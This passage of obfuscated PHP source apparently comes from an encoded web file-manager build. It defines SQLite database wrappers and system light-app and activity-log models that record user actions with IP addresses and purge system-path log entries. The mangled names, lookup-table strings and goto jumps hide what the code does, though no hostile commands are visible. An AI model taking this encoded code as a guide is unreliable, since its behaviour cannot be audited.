$ª©Ÿ§±Õ = array(); if ($this->numRows > 0) { for ($˜éù‰öÕ = 0; $˜éù‰öÕ < $this->numRows; $˜éù‰öÕ++) { $ª©Ÿ§±Õ[$˜éù‰öÕ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $ª©Ÿ§±Õ; } public function getFields($³²ú‚öô) { $†ä¬íÒ© =& $_SERVER[™¾ÇÙ¯¹]; $ş³’öÂ = $this->query($†ä¬íÒ©[29] . $³²ú‚öô . $†ä¬íÒ©[30]); $™ûÄß = array(); if ($ş³’öÂ) { foreach ($ş³’öÂ as $ÃËéëÆ => $èáàÃ´) { $™ûÄß[$èáàÃ´[$†ä¬íÒ©[31]]] = array($†ä¬íÒ©[32] => $èáàÃ´[$†ä¬íÒ©[31]], $†ä¬íÒ©[33] => $èáàÃ´[$†ä¬íÒ©[34]], $†ä¬íÒ©[35] => (bool) ($èáàÃ´[$†ä¬íÒ©[36]] === $†ä¬íÒ©[12]), $†ä¬íÒ©[37] => $èáàÃ´[$†ä¬íÒ©[38]], $†ä¬íÒ©[39] => strtolower($èáàÃ´[$†ä¬íÒ©[40]]) == $†ä¬íÒ©[41], $†ä¬íÒ©[42] => strtolower($èáàÃ´[$†ä¬íÒ©[43]]) == $†ä¬íÒ©[44]); } } return $™ûÄß; } public function getTables($·£¶ø£¼ = '') { $Š÷³ËÓá =& $_SERVER[™¾ÇÙ¯¹]; $«÷Œ¶Ò• = $this->query($Š÷³ËÓá[45] . $Š÷³ËÓá[46] . $Š÷³ËÓá[47]); $ª—ÇÇù = array(); foreach ($«÷Œ¶Ò• as $¡ò¦¤¶± => $š©‚éÎº) { $ª—ÇÇù[$¡ò¦¤¶±] = current($š©‚éÎº); } return $ª—ÇÇù; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $å¼»Ïí” =& $_SERVER[™¾ÇÙ¯¹]; $‚à“°é¤ = sqlite_last_error($this->_linkID); $this->error = $‚à“°é¤ . $å¼»Ïí”[4] . sqlite_error_string($‚à“°é¤); if ($å¼»Ïí”[12] != $this->queryStr) { $this->error .= LNG($å¼»Ïí”[48]) . $this->queryStr; } think_trace($this->error, $å¼»Ïí”[12], $å¼»Ïí”[49]); return $this->error; } public function escapeString($ĞĞ¾ø†È) { return sqlite_escape_string($ĞĞ¾ø†È); } public function parseLimit($øŠÖîè) { $‰ş‡áİê =& $_SERVER[™¾ÇÙ¯¹]; $ƒ£à™àû = $‰ş‡áİê[12]; if (!empty($øŠÖîè)) { $øŠÖîè = explode($‰ş‡áİê[50], $øŠÖîè); if (count($øŠÖîè) > 1) { $ƒ£à™àû .= $‰ş‡áİê[51] . $øŠÖîè[1] . $‰ş‡áİê[52] . $øŠÖîè[0] . $‰ş‡áİê[53]; } else { $ƒ£à™àû .= $‰ş‡áİê[51] . $øŠÖîè[0] . $‰ş‡áİê[53]; } } return $ƒ£à™àû; } } class DbSqlite3Base extends Db { public function __construct($ğğÒıà¯ = '') { $Ç²±ŒÜÁ =& $_SERVER[™¾ÇÙ¯¹]; if (!class_exists($Ç²±ŒÜÁ[54])) { think_exception(think_lang($Ç²±ŒÜÁ[14]) . $Ç²±ŒÜÁ[55]); } if (!empty($ğğÒıà¯)) { if (!isset($ğğÒıà¯[$Ç²±ŒÜÁ[16]])) { $ğğÒıà¯[$Ç²±ŒÜÁ[16]] = 438; } $this->config = $ğğÒıà¯; if (empty($this->config[$Ç²±ŒÜÁ[17]])) { $this->config[$Ç²±ŒÜÁ[17]] = array(); } } } public function connect($ëˆÆÒ½² = '', $êâ¥ëÊ‡ = 0) { $ŞÁõ«°ú =& $_SERVER[™¾ÇÙ¯¹]; if (!isset($this->linkID[$êâ¥ëÊ‡])) { if (empty($ëˆÆÒ½²)) { $ëˆÆÒ½² = $this->config; } $this->linkID[$êâ¥ëÊ‡] = new SQLite3($ëˆÆÒ½²[$ŞÁõ«°ú[21]]); if (!$this->linkID[$êâ¥ëÊ‡]) { think_exception($this->linkID[$êâ¥ëÊ‡]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$êâ¥ëÊ‡]->busyTimeout(30000); if (1 != think_config($ŞÁõ«°ú[22])) { unset($this->config); } } return $this->linkID[$êâ¥ëÊ‡]; } public function free() { $this->queryID = null; } public function query($¦›ıí) { $ë‚Ş“Ê =& $_SERVER[™¾ÇÙ¯¹]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¦›ıí; if ($this->queryID) { $this->free(); } think_action_status($ë‚Ş“Ê[23], 1); think_status($ë‚Ş“Ê[24]); $this->queryID = $this->_linkID->query($¦›ıí); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $²‘ºûü… = $this->getAll(); $this->numRows = count($²‘ºûü…); return $²‘ºûü…; } } public function execute($İıæº) { $Ôè¡Ø´Û =& $_SERVER[™¾ÇÙ¯¹]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $İıæº; if ($this->queryID) { $this->free(); } think_action_status($Ôè¡Ø´Û[25], 1); think_status($Ôè¡Ø´Û[24]); $›ôººó• = $this->_linkID->exec($İıæº); $this->debug(); if (!1 === $›ôººó•) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[™¾ÇÙ¯¹][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $úş¢» = $this->_linkID->query($_SERVER[™¾ÇÙ¯¹][27]); if (!$úş¢») { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ô‘‘…Ç = $this->_linkID->query($_SERVER[™¾ÇÙ¯¹][28]); if (!$Ô‘‘…Ç) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ê®ÖšØö = array(); while ($áŒèßºê = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $ê®ÖšØö[] = $áŒèßºê; } $this->queryID->reset(); return $ê®ÖšØö; } public function getFields($¾‚–‹â¶) { $öƒßù×ã =& $_SERVER[™¾ÇÙ¯¹]; $’ì„¤©Ì = $this->query($öƒßù×ã[29] . $¾‚–‹â¶ . $öƒßù×ã[30]); $¥Ê½Ó²­ = array(); if ($’ì„¤©Ì) { foreach ($’ì„¤©Ì as $ºÖÅ’Ã¯ => $»ı˜¥˜œ) { $¥Ê½Ó²­[$»ı˜¥˜œ[$öƒßù×ã[32]]] = array($öƒßù×ã[32] => $»ı˜¥˜œ[$öƒßù×ã[32]], $öƒßù×ã[33] => $»ı˜¥˜œ[$öƒßù×ã[33]], $öƒßù×ã[35] => (bool) ($»ı˜¥˜œ[$öƒßù×ã[35]] === $öƒßù×ã[12]), $öƒßù×ã[37] => $»ı˜¥˜œ[$öƒßù×ã[56]], $öƒßù×ã[39] => (bool) $»ı˜¥˜œ[$öƒßù×ã[57]], $öƒßù×ã[42] => (bool) $»ı˜¥˜œ[$öƒßù×ã[57]]); } } return $¥Ê½Ó²­; } public function getTables($®€’²Ùƒ = '') { $ÒãÜúŠ’ =& $_SERVER[™¾ÇÙ¯¹]; $¿ƒ©Ø¿± = $this->query($ÒãÜúŠ’[45] . $ÒãÜúŠ’[46] . $ÒãÜúŠ’[47]); $åæ…‘×û = array(); foreach ($¿ƒ©Ø¿± as $šÍıÓ¸Æ => $Õ¢ÄÈ¿­) { $åæ…‘×û[$šÍıÓ¸Æ] = current($Õ¢ÄÈ¿­); } return $åæ…‘×û; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ÚÖıÍøÌ =& $_SERVER[™¾ÇÙ¯¹]; $this->error = $this->_linkID->lastErrorMsg(); if ($ÚÖıÍøÌ[12] != $this->queryStr) { $this->error .= LNG($ÚÖıÍøÌ[48]) . $this->queryStr; } think_trace($this->error, $ÚÖıÍøÌ[12], $ÚÖıÍøÌ[49]); return $this->error; } public function escapeString($ŒĞşê»µ) { $™à­ Ë¾ =& $_SERVER[™¾ÇÙ¯¹]; if ($this->_linkID) { return $this->_linkID->escapeString($ŒĞşê»µ); } return str_ireplace($™à­ Ë¾[58], $™à­ Ë¾[59], $ŒĞşê»µ); } public function parseLimit($ˆ¹£±ëÅ) { $Œà¥õ¦ =& $_SERVER[™¾ÇÙ¯¹]; $²Ç³¤áŸ = $Œà¥õ¦[12]; if (!empty($ˆ¹£±ëÅ)) { $ˆ¹£±ëÅ = explode($Œà¥õ¦[50], $ˆ¹£±ëÅ); if (count($ˆ¹£±ëÅ) > 1) { $²Ç³¤áŸ .= $Œà¥õ¦[51] . $ˆ¹£±ëÅ[1] . $Œà¥õ¦[52] . $ˆ¹£±ëÅ[0] . $Œà¥õ¦[53]; } else { $²Ç³¤áŸ .= $Œà¥õ¦[51] . $ˆ¹£±ëÅ[0] . $Œà¥õ¦[53]; } } return $²Ç³¤áŸ; } } goto ešöÎšö¼ø; D–™–Ù·÷: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\x6d\56\x4c\151\x67\150\x74\x41\x70\x70"; public $modelType = "\x53\x79\x73\x74\145\155\117\160\x74\x69\157\156"; public $field = array("\156\x61\x6d\145", "\x67\x72\x6f\165\160", "\x64\145\163\x63", "\143\157\x6e\164\x65\x6e\164"); public function listData($í­ŠõàÙ = false, $­¥Ô¬¾î = "\155\157\144\151\x66\x79\124\x69\x6d\x65", $è¼Ã½¹ö = true) { return parent::listData($í­ŠõàÙ, $­¥Ô¬¾î, $è¼Ã½¹ö); } public function remove($ñğğ¯¦) { $Èû‹ÑöÑ = $this->findByName($ñğğ¯¦); if (!$Èû‹ÑöÑ) { return !1; } return parent::remove($Èû‹ÑöÑ[$_SERVER[™¾ÇÙ¯¹][407]]); } public function add($…ğğä–İ) { if ($this->findByName($…ğğä–İ[$_SERVER[™¾ÇÙ¯¹][32]])) { return !1; } return parent::insert($…ğğä–İ); } public function update($ÉâÃ»Ë¾, $¬•²µäæ) { $ÄáÊËåß =& $_SERVER[™¾ÇÙ¯¹]; $¯ññÜÒÍ = $this->findByName($ÉâÃ»Ë¾); $óå˜Ÿ£Ÿ = $this->findByName($¬•²µäæ[$ÄáÊËåß[32]]); if (!$¯ññÜÒÍ || $óå˜Ÿ£Ÿ && $óå˜Ÿ£Ÿ[$ÄáÊËåß[407]] != $¯ññÜÒÍ[$ÄáÊËåß[407]]) { return !1; } return parent::update($¯ññÜÒÍ[$ÄáÊËåß[407]], $¬•²µäæ); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\171\163\164\x65\x6d\137\x6c\157\x67"; protected $dataAuto = array(array("\143\162\145\x61\x74\145\124\151\x6d\145", "\x74\151\x6d\145", "\x69\156\163\x65\162\x74", "\146\165\x6e\143\164\x69\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $åõÍÀàˆ =& $_SERVER[™¾ÇÙ¯¹]; return array($åõÍÀàˆ[2167] => LNG($åõÍÀàˆ[2168]), $åõÍÀàˆ[2169] => LNG($åõÍÀàˆ[2170]), $åõÍÀàˆ[1780] => LNG($åõÍÀàˆ[2171]), $åõÍÀàˆ[2172] => LNG($åõÍÀàˆ[2173]), $åõÍÀàˆ[2174] => LNG($åõÍÀàˆ[2175]), $åõÍÀàˆ[2176] => LNG($åõÍÀàˆ[2177]), $åõÍÀàˆ[2178] => LNG($åõÍÀàˆ[2179]), $åõÍÀàˆ[1810] => LNG($åõÍÀàˆ[2179]), $åõÍÀàˆ[1811] => LNG($åõÍÀàˆ[2180]), $åõÍÀàˆ[2181] => LNG($åõÍÀàˆ[2182]), $åõÍÀàˆ[2183] => LNG($åõÍÀàˆ[2184]), $åõÍÀàˆ[2185] => LNG($åõÍÀàˆ[2186]), $åõÍÀàˆ[2187] => LNG($åõÍÀàˆ[2188]), $åõÍÀàˆ[1808] => LNG($åõÍÀàˆ[2189]), $åõÍÀàˆ[2190] => LNG($åõÍÀàˆ[2191]), $åõÍÀàˆ[1815] => LNG($åõÍÀàˆ[2192]), $åõÍÀàˆ[2193] => LNG($åõÍÀàˆ[2194]), $åõÍÀàˆ[2195] => LNG($åõÍÀàˆ[2196]), $åõÍÀàˆ[2197] => LNG($åõÍÀàˆ[2198]), $åõÍÀàˆ[2199] => LNG($åõÍÀàˆ[2200]), $åõÍÀàˆ[1818] => LNG($åõÍÀàˆ[2201]), $åõÍÀàˆ[1819] => LNG($åõÍÀàˆ[2202]), $åõÍÀàˆ[2203] => LNG($åõÍÀàˆ[2204]), $åõÍÀàˆ[2205] => LNG($åõÍÀàˆ[2206]), $åõÍÀàˆ[2207] => LNG($åõÍÀàˆ[2208]), $åõÍÀàˆ[1813] => LNG($åõÍÀàˆ[2209]), $åõÍÀàˆ[2210] => LNG($åõÍÀàˆ[2211]), $åõÍÀàˆ[1812] => LNG($åõÍÀàˆ[2212]), $åõÍÀàˆ[2213] => LNG($åõÍÀàˆ[2214]), $åõÍÀàˆ[2215] => LNG($åõÍÀàˆ[2216]), $åõÍÀàˆ[2217] => LNG($åõÍÀàˆ[2218]), $åõÍÀàˆ[2219] => LNG($åõÍÀàˆ[2219]), $åõÍÀàˆ[2220] => LNG($åõÍÀàˆ[1784]), $åõÍÀàˆ[2221] => LNG($åõÍÀàˆ[2222]), $åõÍÀàˆ[2223] => LNG($åõÍÀàˆ[2224]), $åõÍÀàˆ[2225] => LNG($åõÍÀàˆ[2226]), $åõÍÀàˆ[2227] => LNG($åõÍÀàˆ[2228]), $åõÍÀàˆ[2229] => LNG($åõÍÀàˆ[2230]), $åõÍÀàˆ[2231] => LNG($åõÍÀàˆ[2231]), $åõÍÀàˆ[2232] => LNG($åõÍÀàˆ[2233]), $åõÍÀàˆ[2234] => LNG($åõÍÀàˆ[2235]), $åõÍÀàˆ[2236] => LNG($åõÍÀàˆ[2237]), $åõÍÀàˆ[2238] => LNG($åõÍÀàˆ[2239]), $åõÍÀàˆ[2240] => LNG($åõÍÀàˆ[2241]), $åõÍÀàˆ[2242] => LNG($åõÍÀàˆ[2243])); } private function typeFile() { $”êğı·Ò =& $_SERVER[™¾ÇÙ¯¹]; $Óá‚ÀÄê = array($”êğı·Ò[1815] => array($”êğı·Ò[1816]), $”êğı·Ò[2185] => array($”êğı·Ò[2244]), $”êğı·Ò[2187] => array($”êğı·Ò[2245]), $”êğı·Ò[1808] => array($”êğı·Ò[1809]), $”êğı·Ò[2195] => array(), $”êğı·Ò[2197] => array(), $”êğı·Ò[2199] => array(), $”êğı·Ò[1818] => array($”êğı·Ò[1820]), $”êğı·Ò[1819] => array($”êğı·Ò[1820]), $”êğı·Ò[2203] => array($”êğı·Ò[2246]), $”êğı·Ò[2205] => array($”êğı·Ò[2246]), $”êğı·Ò[2207] => array($”êğı·Ò[2247]), $”êğı·Ò[2193] => array($”êğı·Ò[2248]), $”êğı·Ò[1813] => array($”êğı·Ò[2249]), $”êğı·Ò[2210] => array($”êğı·Ò[2250]), $”êğı·Ò[1812] => array($”êğı·Ò[1814])); return $Óá‚ÀÄê; } private function typeAll() { $œÏğ‚ó =& $_SERVER[™¾ÇÙ¯¹]; $ Êü÷”Ã = $this->typeList; $¤·Í–ê = array_filter($this->typeFile()); foreach ($¤·Í–ê as $‚ÍÓº => $İ›»¸Ğ¹) { $ Êü÷”Ã[$İ›»¸Ğ¹[0]] = $ Êü÷”Ã[$‚ÍÓº]; } $ Êü÷”Ã[$œÏğ‚ó[1820]] = LNG($œÏğ‚ó[2251]); $ Êü÷”Ã[$œÏğ‚ó[2246]] = LNG($œÏğ‚ó[2252]); return $ Êü÷”Ã; } public function addLog($á·çÀ·, $ªõøİ– = array()) { $ÊûÊ¥Ê£ =& $_SERVER[™¾ÇÙ¯¹]; if (!isset($this->typeList[$á·çÀ·])) { return; } $¹ÜÛì©° = defined($ÊûÊ¥Ê£[483]) && USER_ID ? USER_ID : (isset($ªõøİ–[$ÊûÊ¥Ê£[1665]]) ? $ªõøİ–[$ÊûÊ¥Ê£[1665]] : 0); if (!$¹ÜÛì©°) { $¹ÜÛì©° = (int) Session::get($ÊûÊ¥Ê£[1974]); } if ($á·çÀ· == $ÊûÊ¥Ê£[2221] && is_array($ªõøİ–[$ÊûÊ¥Ê£[2253]]) && !$ªõøİ–[$ÊûÊ¥Ê£[2253]]) { return; } $¢©¢¬úø = get_client_ip(); if (!$ªõøİ– || strlen(json_encode($ªõøİ–)) >= 1024) { $ªõøİ– = array($ÊûÊ¥Ê£[2254] => $¢©¢¬úø); } else { if (is_array($ªõøİ–)) { $ªõøİ–[$ÊûÊ¥Ê£[2254]] = $¢©¢¬úø; } else { $ªõøİ– = array($ÊûÊ¥Ê£[1201] => $ªõøİ–, $ÊûÊ¥Ê£[2254] => $¢©¢¬úø); } } $ªõøİ– = array($ÊûÊ¥Ê£[1655] => Session::sign(), $ÊûÊ¥Ê£[1656] => $¹ÜÛì©°, $ÊûÊ¥Ê£[33] => $á·çÀ·, $ÊûÊ¥Ê£[1658] => json_encode($ªõøİ–)); parent::add($ªõøİ–); } public function remove($î–á„Éœ) { $this->where(array($_SERVER[™¾ÇÙ¯¹][427] => $î–á„Éœ))->delete(); } private function _makeOrder($µ ôÕ¢¼ = '') { $€ÓÈÚçÀ =& $_SERVER[™¾ÇÙ¯¹]; $‡ ôÒ¾ä = $€ÓÈÚçÀ[200]; $íÆœŠ£• = array($€ÓÈÚçÀ[458] => $€ÓÈÚçÀ[459], $€ÓÈÚçÀ[460] => $€ÓÈÚçÀ[461]); $ùÂ±´ÍŒ = Input::get($€ÓÈÚçÀ[466], $€ÓÈÚçÀ[7], $€ÓÈÚçÀ[2006], array($€ÓÈÚçÀ[1928], $€ÓÈÚçÀ[460])); $ùÂ±´ÍŒ = $íÆœŠ£•[$ùÂ±´ÍŒ]; $µ ôÕ¢¼ = $µ ôÕ¢¼ . "{$‡ ôÒ¾ä}\40{$ùÂ±´ÍŒ}"; return $this->order($µ ôÕ¢¼); } public function get($¢¿Óˆƒ• = '') { $ı†×ñ‰¾ =& $_SERVER[™¾ÇÙ¯¹]; if (!$¢¿Óˆƒ•) { show_json(array()); } $âğáŞ‹ı = array(); if ($¢¿Óˆƒ•[$ı†×ñ‰¾[1665]]) { $âğáŞ‹ı[$ı†×ñ‰¾[1665]] = $¢¿Óˆƒ•[$ı†×ñ‰¾[1665]]; } if (isset($¢¿Óˆƒ•[$ı†×ñ‰¾[776]])) { $²ÅİÛ†ê = $¢¿Óˆƒ•[$ı†×ñ‰¾[776]]; $éÔÔÑØ… = isset($¢¿Óˆƒ•[$ı†×ñ‰¾[505]]) ? $¢¿Óˆƒ•[$ı†×ñ‰¾[505]] : time(); $âğáŞ‹ı[$ı†×ñ‰¾[200]] = array($ı†×ñ‰¾[342], array($²ÅİÛ†ê, $éÔÔÑØ…)); } if ($¢¿Óˆƒ•[$ı†×ñ‰¾[33]]) { $ÔŒÑú‚ = explode($ı†×ñ‰¾[50], $¢¿Óˆƒ•[$ı†×ñ‰¾[33]]); $ïæ¹²¡ = $this->typeFile(); $êšŠ¯¬Á = array(); foreach ($ÔŒÑú‚ as $›ƒÒ¢é§) { $êšŠ¯¬Á[] = $›ƒÒ¢é§; if (isset($ïæ¹²¡[$›ƒÒ¢é§])) { $êšŠ¯¬Á = array_merge($êšŠ¯¬Á, $ïæ¹²¡[$›ƒÒ¢é§]); } } $êšŠ¯¬Á = array_unique($êšŠ¯¬Á); if ($êšŠ¯¬Á) { $âğáŞ‹ı[$ı†×ñ‰¾[33]] = array($ı†×ñ‰¾[7], $êšŠ¯¬Á); } } else { $âğáŞ‹ı[$ı†×ñ‰¾[33]] = array($ı†×ñ‰¾[2255], $ı†×ñ‰¾[2256]); } if (!empty($¢¿Óˆƒ•[$ı†×ñ‰¾[2254]])) { $âğáŞ‹ı[$ı†×ñ‰¾[461]] = array($ı†×ñ‰¾[391], "\45{$¢¿Óˆƒ•[$ı†×ñ‰¾[2254]]}\45"); } $ìæÀáÎÁ = $this->_makeOrder()->where($âğáŞ‹ı)->selectPage(); if (empty($ìæÀáÎÁ[$ı†×ñ‰¾[378]])) { show_json(array(), !0, $ìæÀáÎÁ[$ı†×ñ‰¾[375]]); } $ìæÀáÎÁ[$ı†×ñ‰¾[378]] = $this->logList($ìæÀáÎÁ[$ı†×ñ‰¾[378]]); return $ìæÀáÎÁ; } private function ipAddress(&$Ó³Ü§Øø) { $ä½Ëğ­Ø =& $_SERVER[™¾ÇÙ¯¹]; if (!empty($Ó³Ü§Øø[$ä½Ëğ­Ø[2254]])) { $½Ñë¡ ¹ = IpLocation::get($Ó³Ü§Øø[$ä½Ëğ­Ø[2254]]); } else { $½Ñë¡ ¹ = LNG($ä½Ëğ­Ø[2257]); } $Ó³Ü§Øø[$ä½Ëğ­Ø[2258]] = $½Ñë¡ ¹; } private function descZipDownload($»Ü¬¸ÜÓ, &$òù”‰ü”) { $÷ı…ë…÷ =& $_SERVER[™¾ÇÙ¯¹]; if (!isset($»Ü¬¸ÜÓ[$÷ı…ë…÷[2259]])) { return; } $ÎÀÊÄıÙ = json_decode($»Ü¬¸ÜÓ[$÷ı…ë…÷[2259]], !0); foreach ($ÎÀÊÄıÙ as $…áÁÕãğ) { try { $Ğ¾Ø‚˜— = IO::infoFull($…áÁÕãğ[$÷ı…ë…÷[84]]); } catch (Exception $¸´œŞ¨ş) { continue; } $»Ü¬¸ÜÓ[$÷ı…ë…÷[84]] = $…áÁÕãğ[$÷ı…ë…÷[84]]; $òù”‰ü”[] = $»Ü¬¸ÜÓ[$÷ı…ë…÷[410]] = $Ğ¾Ø‚˜—[$÷ı…ë…÷[410]]; $òù”‰ü”[] = $»Ü¬¸ÜÓ[$÷ı…ë…÷[2060]] = $Ğ¾Ø‚˜—[$÷ı…ë…÷[440]]; break; } return $»Ü¬¸ÜÓ; } private function getSourceList(&$Æ„èÈÉÊ) { $¾´á‚œà =& $_SERVER[™¾ÇÙ¯¹]; $ò¼Õ¢–Ğ = array(); foreach ($Æ„èÈÉÊ as $éêßÙÇ => $ş˜Ì‡¿û) { $†…¾İ³ = json_decode($ş˜Ì‡¿û[$¾´á‚œà[461]], !0); if ($ş˜Ì‡¿û[$¾´á‚œà[33]] == $¾´á‚œà[1811]) { $†…¾İ³ = $this->descZipDownload($†…¾İ³, $ò¼Õ¢–Ğ); $Æ„èÈÉÊ[$éêßÙÇ][$¾´á‚œà[461]] = json_encode($†…¾İ³); continue; } if (strpos($ş˜Ì‡¿û[$¾´á‚œà[33]], $¾´á‚œà[2062]) !== 0) { if (!isset($†…¾İ³[$¾´á‚œà[84]]) || strpos($ş˜Ì‡¿û[$¾´á‚œà[33]], $¾´á‚œà[2260]) !== 0) { continue; } try { $ğíÔõ¿ = IO::infoFull($†…¾İ³[$¾´á‚œà[84]]); } catch (Exception $ÒìüµÙğ) { continue; } $ò¼Õ¢–Ğ[] = $†…¾İ³[$¾´á‚œà[410]] = $ğíÔõ¿[$¾´á‚œà[410]]; $ò¼Õ¢–Ğ[] = $†…¾İ³[$¾´á‚œà[2060]] = $ğíÔõ¿[$¾´á‚œà[440]]; $Æ„èÈÉÊ[$éêßÙÇ][$¾´á‚œà[461]] = json_encode($†…¾İ³); continue; } $ò¼Õ¢–Ğ[] = $†…¾İ³[$¾´á‚œà[410]]; $ò¼Õ¢–Ğ[] = $†…¾İ³[$¾´á‚œà[2060]]; if ($†…¾İ³[$¾´á‚œà[33]] == $¾´á‚œà[565]) { $ò¼Õ¢–Ğ[] = $†…¾İ³[$¾´á‚œà[461]][$¾´á‚œà[1168]]; $ò¼Õ¢–Ğ[] = $†…¾İ³[$¾´á‚œà[461]][$¾´á‚œà[1169]]; } if ($†…¾İ³[$¾´á‚œà[33]] == $¾´á‚œà[2070]) { $ò¼Õ¢–Ğ[] = $†…¾İ³[$¾´á‚œà[461]][$¾´á‚œà[410]]; } } if (!$ò¼Õ¢–Ğ) { return array(); } return Model($¾´á‚œà[840])->sourceListInfo($ò¼Õ¢–Ğ, !0); } private function logList($Ëß»êİ­) { $×€»Ç¦İ =& $_SERVER[™¾ÇÙ¯¹]; $Å½ğÕ‹ = array_to_keyvalue($Ëß»êİ­, $×€»Ç¦İ[12], $×€»Ç¦İ[1665]); $¯Àõ³¹Ö = Model($×€»Ç¦İ[543])->userListInfo(array_unique($Å½ğÕ‹)); $„¹à‡…„ = $this->getSourceList($Ëß»êİ­); $ÉâèÊ½Ê = $this->typeAll(); $à×³³êÛ = array(); $¶´úŒÎş = array(); foreach ($Ëß»êİ­ as $—¬ï²¼ => $­Ä†ÂÏ) { $¸ÛŒùµğ = $­Ä†ÂÏ[$×€»Ç¦İ[33]]; $Ô—„õ¹é = isset($¯Àõ³¹Ö[$­Ä†ÂÏ[$×€»Ç¦İ[1665]]]) ? $¯Àõ³¹Ö[$­Ä†ÂÏ[$×€»Ç¦İ[1665]]] : !1; $¼ŠÀ·ª = strpos($¸ÛŒùµğ, $×€»Ç¦İ[2261]) === 0 ? LNG($×€»Ç¦İ[2262]) : LNG($×€»Ç¦İ[2257]); $­Ä†ÂÏ[$×€»Ç¦İ[32]] = isset($Ô—„õ¹é[$×€»Ç¦İ[32]]) ? $Ô—„õ¹é[$×€»Ç¦İ[32]] : LNG($×€»Ç¦İ[2257]); $­Ä†ÂÏ[$×€»Ç¦İ[550]] = isset($Ô—„õ¹é[$×€»Ç¦İ[550]]) ? $Ô—„õ¹é[$×€»Ç¦İ[550]] : $×€»Ç¦İ[12]; $­Ä†ÂÏ[$×€»Ç¦İ[1564]] = isset($ÉâèÊ½Ê[$¸ÛŒùµğ]) ? $ÉâèÊ½Ê[$¸ÛŒùµğ] : $¼ŠÀ·ª; $­Ä†ÂÏ[$×€»Ç¦İ[2005]] = $Ô—„õ¹é; $³ô®âì = json_decode($­Ä†ÂÏ[$×€»Ç¦İ[461]], !0); $­Ä†ÂÏ[$×€»Ç¦İ[2254]] = isset($³ô®âì[$×€»Ç¦İ[2254]]) ? $³ô®âì[$×€»Ç¦İ[2254]] : $×€»Ç¦İ[12]; $­Ä†ÂÏ[$×€»Ç¦İ[2258]] = IpLocation::get($­Ä†ÂÏ[$×€»Ç¦İ[2254]]); if (strpos($¸ÛŒùµğ, $×€»Ç¦İ[2062]) === 0 || isset($³ô®âì[$×€»Ç¦İ[2060]])) { $³ô®âì[$×€»Ç¦İ[86]] = $„¹à‡…„[$³ô®âì[$×€»Ç¦İ[410]]]; $³ô®âì[$×€»Ç¦İ[2075]] = $„¹à‡…„[$³ô®âì[$×€»Ç¦İ[2060]]]; if ($³ô®âì[$×€»Ç¦İ[33]] == $×€»Ç¦İ[565]) { $³ô®âì[$×€»Ç¦İ[461]][$×€»Ç¦İ[1168]] = $„¹à‡…„[$³ô®âì[$×€»Ç¦İ[461]][$×€»Ç¦İ[1168]]]; $³ô®âì[$×€»Ç¦İ[461]][$×€»Ç¦İ[1169]] = $„¹à‡…„[$³ô®âì[$×€»Ç¦İ[461]][$×€»Ç¦İ[1169]]]; } if ($³ô®âì[$×€»Ç¦İ[33]] == $×€»Ç¦İ[2070]) { $³ô®âì[$×€»Ç¦İ[461]][$×€»Ç¦İ[410]] = $„¹à‡…„[$³ô®âì[$×€»Ç¦İ[461]][$×€»Ç¦İ[410]]]; } if ($³ô®âì[$×€»Ç¦İ[33]] == $×€»Ç¦İ[1806]) { $³ô®âì[$×€»Ç¦İ[2075]] = $³ô®âì[$×€»Ç¦İ[86]]; $³ô®âì[$×€»Ç¦İ[2060]] = $³ô®âì[$×€»Ç¦İ[2075]][$×€»Ç¦İ[410]]; $³ô®âì[$×€»Ç¦İ[86]] = !1; $³ô®âì[$×€»Ç¦İ[410]] = $×€»Ç¦İ[12]; } if ($³ô®âì[$×€»Ç¦İ[86]] && $³ô®âì[$×€»Ç¦İ[86]][$×€»Ç¦İ[419]] == $×€»Ç¦İ[1284]) { $¶´úŒÎş[] = $­Ä†ÂÏ[$×€»Ç¦İ[407]]; unset($Ëß»êİ­[$—¬ï²¼]); continue; } if ($³ô®âì[$×€»Ç¦İ[2075]] && $³ô®âì[$×€»Ç¦İ[2075]][$×€»Ç¦İ[419]] == $×€»Ç¦İ[1284]) { $¶´úŒÎş[] = $­Ä†ÂÏ[$×€»Ç¦İ[407]]; unset($Ëß»êİ­[$—¬ï²¼]); continue; } } $­Ä†ÂÏ[$×€»Ç¦İ[461]] = $³ô®âì; unset($­Ä†ÂÏ[$×€»Ç¦İ[2263]]); $à×³³êÛ[] = $­Ä†ÂÏ; } $this->clearSystemPathLog($¶´úŒÎş); return $à×³³êÛ; } private function clearSystemPathLog($¾†­ß†) { $“™Ş˜ì =& $_SERVER[™¾ÇÙ¯¹]; if (count($¾†­ß†) == 0) { return; } $»ò’ÑØ = array($“™Ş˜ì[407] => array($“™Ş˜ì[7], array_unique($¾†­ß†))); $this->where($»ò’ÑØ)->delete(); } public function deviceList($Êë´î÷Š, $ÃÓşö = 0) { $Ë°¹¶« =& $_SERVER[™¾ÇÙ¯¹]; $¬’Š²Òá = array($Ë°¹¶«[1665] => $Êë´î÷Š, $Ë°¹¶«[200] => array($Ë°¹¶«[1022], $ÃÓşö), $Ë°¹¶«[33] => $Ë°¹¶«[1780]); $Î«£ò® = array(); $êáñ×¦· = $this->field($Ë°¹¶«[2264])->where($¬’Š²Òá)->order($Ë°¹¶«[2073])->limit(50)->select(); foreach ($êáñ×¦· as $—íË›ÆÉ => $¹¯ëŠÖ‚) { if ($—íË›ÆÉ > 0 && abs($¹¯ëŠÖ‚[$Ë°¹¶«[200]] - 